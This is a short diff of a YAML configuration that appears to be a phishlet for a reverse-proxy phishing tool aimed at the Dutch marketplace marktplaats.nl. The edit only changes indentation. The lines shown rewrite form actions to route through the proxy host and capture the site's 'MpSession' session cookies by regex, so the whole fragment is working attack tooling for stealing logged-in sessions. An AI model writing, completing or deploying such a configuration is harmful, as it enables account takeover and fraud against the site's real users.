@@ -7,7 +7,7 @@ sub_filters:
   - {triggers_on: 'marktplaats.nl', orig_sub: 'www', domain: 'marktplaats.nl', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
 
 auth_tokens:
-  - domain: 'marktplaats.nl'
+ - domain: 'marktplaats.nl'
    keys: ['MpSession(.*),regexp']
 
 auth_urls:
